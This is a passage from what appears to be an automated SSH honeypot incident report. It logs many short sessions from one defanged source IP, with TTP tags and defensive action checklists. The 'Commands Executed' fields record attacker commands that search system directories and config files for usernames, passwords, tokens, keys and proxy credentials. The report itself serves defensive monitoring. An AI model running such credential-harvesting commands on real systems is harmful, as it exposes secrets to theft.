| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:21` | `cowrie.session.connect` |
| `2026-07-13 12:38:21` | `cowrie.client.version` |
| `2026-07-13 12:38:21` | `cowrie.client.kex` |
| `2026-07-13 12:38:22` | `cowrie.login.success` |
| `2026-07-13 12:38:23` | `cowrie.client.var` |
| `2026-07-13 12:38:23` | `cowrie.client.var` |
| `2026-07-13 12:38:23` | `cowrie.session.params` |
| `2026-07-13 12:38:23` | `cowrie.command.input` |
| `2026-07-13 12:38:23` | `cowrie.log.closed` |
| `2026-07-13 12:38:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a371eaf00a4

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:24` | `cowrie.session.connect` |
| `2026-07-13 12:38:24` | `cowrie.client.version` |
| `2026-07-13 12:38:24` | `cowrie.client.kex` |
| `2026-07-13 12:38:25` | `cowrie.login.success` |
| `2026-07-13 12:38:26` | `cowrie.client.var` |
| `2026-07-13 12:38:26` | `cowrie.client.var` |
| `2026-07-13 12:38:26` | `cowrie.session.params` |
| `2026-07-13 12:38:26` | `cowrie.command.input` |
| `2026-07-13 12:38:26` | `cowrie.log.closed` |
| `2026-07-13 12:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4625c0709091

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:27` | `cowrie.session.connect` |
| `2026-07-13 12:38:27` | `cowrie.client.version` |
| `2026-07-13 12:38:27` | `cowrie.client.kex` |
| `2026-07-13 12:38:28` | `cowrie.login.success` |
| `2026-07-13 12:38:29` | `cowrie.client.var` |
| `2026-07-13 12:38:29` | `cowrie.client.var` |
| `2026-07-13 12:38:30` | `cowrie.session.params` |
| `2026-07-13 12:38:30` | `cowrie.command.input` |
| `2026-07-13 12:38:30` | `cowrie.log.closed` |
| `2026-07-13 12:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73692ac68786

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:30` | `cowrie.session.connect` |
| `2026-07-13 12:38:30` | `cowrie.client.version` |
| `2026-07-13 12:38:30` | `cowrie.client.kex` |
| `2026-07-13 12:38:32` | `cowrie.login.success` |
| `2026-07-13 12:38:32` | `cowrie.client.var` |
| `2026-07-13 12:38:32` | `cowrie.client.var` |
| `2026-07-13 12:38:33` | `cowrie.session.params` |
| `2026-07-13 12:38:33` | `cowrie.command.input` |
| `2026-07-13 12:38:33` | `cowrie.log.closed` |
| `2026-07-13 12:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cefeae41c06

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'username' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:33` | `cowrie.session.connect` |
| `2026-07-13 12:38:33` | `cowrie.client.version` |
| `2026-07-13 12:38:33` | `cowrie.client.kex` |
| `2026-07-13 12:38:35` | `cowrie.login.success` |
| `2026-07-13 12:38:35` | `cowrie.client.var` |
| `2026-07-13 12:38:35` | `cowrie.client.var` |
| `2026-07-13 12:38:36` | `cowrie.session.params` |
| `2026-07-13 12:38:36` | `cowrie.command.input` |
| `2026-07-13 12:38:36` | `cowrie.log.closed` |
| `2026-07-13 12:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f666e7be64f1

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'username|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:36` | `cowrie.session.connect` |
| `2026-07-13 12:38:36` | `cowrie.client.version` |
| `2026-07-13 12:38:36` | `cowrie.client.kex` |
| `2026-07-13 12:38:38` | `cowrie.login.success` |
| `2026-07-13 12:38:38` | `cowrie.client.var` |
| `2026-07-13 12:38:38` | `cowrie.client.var` |
| `2026-07-13 12:38:39` | `cowrie.session.params` |
| `2026-07-13 12:38:39` | `cowrie.command.input` |
| `2026-07-13 12:38:39` | `cowrie.log.closed` |
| `2026-07-13 12:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a34f4bc728

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'username|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:40` | `cowrie.session.connect` |
| `2026-07-13 12:38:40` | `cowrie.client.version` |
| `2026-07-13 12:38:40` | `cowrie.client.kex` |
| `2026-07-13 12:38:41` | `cowrie.login.success` |
| `2026-07-13 12:38:42` | `cowrie.client.var` |
| `2026-07-13 12:38:42` | `cowrie.client.var` |
| `2026-07-13 12:38:42` | `cowrie.session.params` |
| `2026-07-13 12:38:42` | `cowrie.command.input` |
| `2026-07-13 12:38:42` | `cowrie.log.closed` |
| `2026-07-13 12:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c057de6324

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'username|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:43` | `cowrie.session.connect` |
| `2026-07-13 12:38:43` | `cowrie.client.version` |
| `2026-07-13 12:38:43` | `cowrie.client.kex` |
| `2026-07-13 12:38:44` | `cowrie.login.success` |
| `2026-07-13 12:38:44` | `cowrie.client.var` |
| `2026-07-13 12:38:44` | `cowrie.client.var` |
| `2026-07-13 12:38:45` | `cowrie.session.params` |
| `2026-07-13 12:38:45` | `cowrie.command.input` |
| `2026-07-13 12:38:45` | `cowrie.log.closed` |
| `2026-07-13 12:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e35d4f9c38c

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'username|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:46` | `cowrie.session.connect` |
| `2026-07-13 12:38:46` | `cowrie.client.version` |
| `2026-07-13 12:38:46` | `cowrie.client.kex` |
| `2026-07-13 12:38:47` | `cowrie.login.success` |
| `2026-07-13 12:38:48` | `cowrie.client.var` |
| `2026-07-13 12:38:48` | `cowrie.client.var` |
| `2026-07-13 12:38:48` | `cowrie.session.params` |
| `2026-07-13 12:38:48` | `cowrie.command.input` |
| `2026-07-13 12:38:48` | `cowrie.log.closed` |
| `2026-07-13 12:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f54c028484

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'username|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:49` | `cowrie.session.connect` |
| `2026-07-13 12:38:49` | `cowrie.client.version` |
| `2026-07-13 12:38:49` | `cowrie.client.kex` |
| `2026-07-13 12:38:51` | `cowrie.login.success` |
| `2026-07-13 12:38:51` | `cowrie.client.var` |
| `2026-07-13 12:38:51` | `cowrie.client.var` |
| `2026-07-13 12:38:52` | `cowrie.session.params` |
| `2026-07-13 12:38:52` | `cowrie.command.input` |
| `2026-07-13 12:38:52` | `cowrie.log.closed` |
| `2026-07-13 12:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd70936f44c2

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'username|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:52` | `cowrie.session.connect` |
| `2026-07-13 12:38:52` | `cowrie.client.version` |
| `2026-07-13 12:38:53` | `cowrie.client.kex` |
| `2026-07-13 12:38:54` | `cowrie.login.success` |
| `2026-07-13 12:38:54` | `cowrie.client.var` |
| `2026-07-13 12:38:54` | `cowrie.client.var` |
| `2026-07-13 12:38:55` | `cowrie.session.params` |
| `2026-07-13 12:38:55` | `cowrie.command.input` |
| `2026-07-13 12:38:55` | `cowrie.log.closed` |
| `2026-07-13 12:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a0c1d9078de

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'username|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:56` | `cowrie.session.connect` |
| `2026-07-13 12:38:56` | `cowrie.client.version` |
| `2026-07-13 12:38:56` | `cowrie.client.kex` |
| `2026-07-13 12:38:57` | `cowrie.login.success` |
| `2026-07-13 12:38:58` | `cowrie.client.var` |
| `2026-07-13 12:38:58` | `cowrie.client.var` |
| `2026-07-13 12:38:58` | `cowrie.session.params` |
| `2026-07-13 12:38:58` | `cowrie.command.input` |
| `2026-07-13 12:38:58` | `cowrie.log.closed` |
| `2026-07-13 12:38:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d168940682

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'user' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:59` | `cowrie.session.connect` |
| `2026-07-13 12:38:59` | `cowrie.client.version` |
| `2026-07-13 12:38:59` | `cowrie.client.kex` |
| `2026-07-13 12:39:01` | `cowrie.login.success` |
| `2026-07-13 12:39:01` | `cowrie.client.var` |
| `2026-07-13 12:39:01` | `cowrie.client.var` |
| `2026-07-13 12:39:02` | `cowrie.session.params` |
| `2026-07-13 12:39:02` | `cowrie.command.input` |
| `2026-07-13 12:39:02` | `cowrie.log.closed` |
| `2026-07-13 12:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eafa32833ea

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'user|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:02` | `cowrie.session.connect` |
| `2026-07-13 12:39:02` | `cowrie.client.version` |
| `2026-07-13 12:39:02` | `cowrie.client.kex` |
| `2026-07-13 12:39:04` | `cowrie.login.success` |
| `2026-07-13 12:39:04` | `cowrie.client.var` |
| `2026-07-13 12:39:04` | `cowrie.client.var` |
| `2026-07-13 12:39:05` | `cowrie.session.params` |
| `2026-07-13 12:39:05` | `cowrie.command.input` |
| `2026-07-13 12:39:05` | `cowrie.log.closed` |
| `2026-07-13 12:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6db24ee25f81

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'user|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:05` | `cowrie.session.connect` |
| `2026-07-13 12:39:05` | `cowrie.client.version` |
| `2026-07-13 12:39:06` | `cowrie.client.kex` |
| `2026-07-13 12:39:07` | `cowrie.login.success` |
| `2026-07-13 12:39:07` | `cowrie.client.var` |
| `2026-07-13 12:39:07` | `cowrie.client.var` |
| `2026-07-13 12:39:08` | `cowrie.session.params` |
| `2026-07-13 12:39:08` | `cowrie.command.input` |
| `2026-07-13 12:39:08` | `cowrie.log.closed` |
| `2026-07-13 12:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c0a9a7d905d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'user|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:08` | `cowrie.session.connect` |
| `2026-07-13 12:39:08` | `cowrie.client.version` |
| `2026-07-13 12:39:09` | `cowrie.client.kex` |
| `2026-07-13 12:39:10` | `cowrie.login.success` |
| `2026-07-13 12:39:11` | `cowrie.client.var` |
| `2026-07-13 12:39:11` | `cowrie.client.var` |
| `2026-07-13 12:39:11` | `cowrie.session.params` |
| `2026-07-13 12:39:11` | `cowrie.command.input` |
| `2026-07-13 12:39:11` | `cowrie.log.closed` |
| `2026-07-13 12:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e1fe1cc1241

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'user|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:12` | `cowrie.session.connect` |
| `2026-07-13 12:39:12` | `cowrie.client.version` |
| `2026-07-13 12:39:12` | `cowrie.client.kex` |
| `2026-07-13 12:39:13` | `cowrie.login.success` |
| `2026-07-13 12:39:14` | `cowrie.client.var` |
| `2026-07-13 12:39:14` | `cowrie.client.var` |
| `2026-07-13 12:39:14` | `cowrie.session.params` |
| `2026-07-13 12:39:14` | `cowrie.command.input` |
| `2026-07-13 12:39:14` | `cowrie.log.closed` |
| `2026-07-13 12:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5509dd6486f

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'user|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:15` | `cowrie.session.connect` |
| `2026-07-13 12:39:15` | `cowrie.client.version` |
| `2026-07-13 12:39:15` | `cowrie.client.kex` |
| `2026-07-13 12:39:16` | `cowrie.login.success` |
| `2026-07-13 12:39:17` | `cowrie.client.var` |
| `2026-07-13 12:39:17` | `cowrie.client.var` |
| `2026-07-13 12:39:17` | `cowrie.session.params` |
| `2026-07-13 12:39:17` | `cowrie.command.input` |
| `2026-07-13 12:39:17` | `cowrie.log.closed` |
| `2026-07-13 12:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36e3893381a1

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'user|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:18` | `cowrie.session.connect` |
| `2026-07-13 12:39:18` | `cowrie.client.version` |
| `2026-07-13 12:39:18` | `cowrie.client.kex` |
| `2026-07-13 12:39:19` | `cowrie.login.success` |
| `2026-07-13 12:39:20` | `cowrie.client.var` |
| `2026-07-13 12:39:20` | `cowrie.client.var` |
| `2026-07-13 12:39:21` | `cowrie.session.params` |
| `2026-07-13 12:39:21` | `cowrie.command.input` |
| `2026-07-13 12:39:21` | `cowrie.log.closed` |
| `2026-07-13 12:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a401b0d35544

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'user|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:21` | `cowrie.session.connect` |
| `2026-07-13 12:39:21` | `cowrie.client.version` |
| `2026-07-13 12:39:21` | `cowrie.client.kex` |
| `2026-07-13 12:39:23` | `cowrie.login.success` |
| `2026-07-13 12:39:23` | `cowrie.client.var` |
| `2026-07-13 12:39:23` | `cowrie.client.var` |
| `2026-07-13 12:39:24` | `cowrie.session.params` |
| `2026-07-13 12:39:24` | `cowrie.command.input` |
| `2026-07-13 12:39:24` | `cowrie.log.closed` |
| `2026-07-13 12:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ae5caeea818

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'proxy_auth' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:24` | `cowrie.session.connect` |
| `2026-07-13 12:39:24` | `cowrie.client.version` |
| `2026-07-13 12:39:25` | `cowrie.client.kex` |
| `2026-07-13 12:39:26` | `cowrie.login.success` |
| `2026-07-13 12:39:26` | `cowrie.client.var` |
| `2026-07-13 12:39:26` | `cowrie.client.var` |
| `2026-07-13 12:39:27` | `cowrie.session.params` |
| `2026-07-13 12:39:27` | `cowrie.command.input` |
| `2026-07-13 12:39:27` | `cowrie.log.closed` |
| `2026-07-13 12:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1812fce5e3fd

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'proxy_auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:27` | `cowrie.session.connect` |
| `2026-07-13 12:39:27` | `cowrie.client.version` |
| `2026-07-13 12:39:28` | `cowrie.client.kex` |
| `2026-07-13 12:39:29` | `cowrie.login.success` |
| `2026-07-13 12:39:30` | `cowrie.client.var` |
| `2026-07-13 12:39:30` | `cowrie.client.var` |
| `2026-07-13 12:39:30` | `cowrie.session.params` |
| `2026-07-13 12:39:30` | `cowrie.command.input` |
| `2026-07-13 12:39:30` | `cowrie.log.closed` |
| `2026-07-13 12:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fc48b97d406

| Field | Detail |
|---|---|
